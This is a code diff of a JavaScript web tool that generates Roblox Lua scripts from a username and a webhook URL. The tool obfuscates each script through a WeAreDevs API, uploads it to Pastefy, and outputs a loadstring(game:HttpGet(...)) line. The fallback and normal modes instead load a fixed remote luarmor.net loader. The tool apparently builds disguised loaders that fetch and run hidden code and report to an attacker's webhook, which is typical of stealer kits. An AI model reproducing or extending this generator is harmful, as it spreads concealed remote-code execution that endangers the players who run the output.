@@ -25,32 +25,16 @@ document.addEventListener('DOMContentLoaded', () => {
     });
 
     // ============================================================
-    //  SHORT LOADSTRING TOGGLE & LINK PROVIDER
+    //  SHORT LOADSTRING TOGGLE
     // ============================================================
     const toggleSwitch = document.getElementById('shortToggle');
-    const linkProvider = document.getElementById('linkProvider');
-    const providerBtns = document.querySelectorAll('.provider-btn');
     let shortEnabled = false;
-    let selectedProvider = 'pastefy';
 
     toggleSwitch.addEventListener('click', () => {
         shortEnabled = !shortEnabled;
         toggleSwitch.classList.toggle('on', shortEnabled);
         const label = toggleSwitch.querySelector('.toggle-label');
         label.textContent = shortEnabled ? 'ON' : 'OFF';
-        if (shortEnabled) {
-            linkProvider.classList.remove('hidden');
-        } else {
-            linkProvider.classList.add('hidden');
-        }
-    });
-
-    providerBtns.forEach(btn => {
-        btn.addEventListener('click', () => {
-            providerBtns.forEach(b => b.classList.remove('active'));
-            btn.classList.add('active');
-            selectedProvider = btn.dataset.provider;
-        });
     });
 
     // ============================================================
@@ -436,7 +420,7 @@ document.addEventListener('DOMContentLoaded', () => {
     //  FUNCIONES DE API (WeAreDevs + Pastefy)
     // ============================================================
 
-    // --- OFUSCAR CON WeAreDevs (URL CORREGIDA) ---
+    // --- OFUSCAR CON WeAreDevs ---
     async function obfuscateWithWeAreDevs(script) {
         const response = await fetch('/api/obfuscate', {
             method: 'POST',
@@ -509,7 +493,7 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     // ============================================================
-    //  GENERAR SCRIPT (FLUJO CORREGIDO)
+    //  GENERAR SCRIPT
     // ============================================================
     const generateBtn = document.getElementById('generateBtn');
     const outputSection = document.getElementById('outputSection');
@@ -520,7 +504,6 @@ document.addEventListener('DOMContentLoaded', () => {
         return Array.from(set);
     }
 
-    // --- NUEVA FUNCIÓN: SOLO CONFIGURACIÓN (SIN task.spawn) ---
     function buildConfigScript() {
         const username = document.getElementById('username').value.trim() || 'USERNAME';
         const webhook = document.getElementById('webhook').value.trim() || 'WEBHOOK_URL';
@@ -561,12 +544,10 @@ document.addEventListener('DOMContentLoaded', () => {
         generateBtn.disabled = true;
 
         try {
-            if (shortEnabled && selectedProvider === 'pastefy') {
-                try {
-                    // 1. Construir script de configuración (sin task.spawn)
-                    const configScript = buildConfigScript();
+            const configScript = buildConfigScript();
 
-                    // 2. Ofuscar con WeAreDevs
+            if (shortEnabled) {
+                try {
                     const fullScript = configScript + `
                     
                     task.spawn(function()
@@ -575,39 +556,17 @@ document.addEventListener('DOMContentLoaded', () => {
                     `;
                     
                     const obfuscatedScript = await obfuscateWithWeAreDevs(fullScript);
-
-                    // 3. Subir el script ofuscado a Pastefy
                     const pastefyUrl = await createPastefyPaste(obfuscatedScript);
-
-                    // 4. El script final será SOLO la línea loadstring
                     const finalScript = `loadstring(game:HttpGet("${pastefyUrl}"))()`;
                     outputCode.textContent = finalScript;
 
                 } catch (apiError) {
                     alert(`Error en el proceso automático: ${apiError.message}\n\nSe usará la URL por defecto.`);
-                    // Fallback: mostrar el script de configuración (sin ofuscar) con URL por defecto
-                    const configScript = buildConfigScript();
                     const fallbackScript = configScript + 
                         `\n\ntask.spawn(function()\n    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()\nend)`;
                     outputCode.textContent = fallbackScript;
                 }
-
-            } else if (shortEnabled) {
-                // Otros proveedores (no implementados)
-                const configScript = buildConfigScript();
-                const providerUrls = {
-                    pastefy: '',
-                    voidexternal: 'https://void.external/raw/...',
-                    rubis: 'https://rubis.xyz/raw/...'
-                };
-                const url = providerUrls[selectedProvider] || 'https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua';
-                const fallbackScript = configScript + 
-                    `\n\ntask.spawn(function()\n    loadstring(game:HttpGet("${url}"))()\nend)`;
-                outputCode.textContent = fallbackScript;
-
             } else {
-                // Modo normal (sin short loadstring)
-                const configScript = buildConfigScript();
                 const normalScript = configScript + 
                     `\n\ntask.spawn(function()\n    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()\nend)`;
                 outputCode.textContent = normalScript;
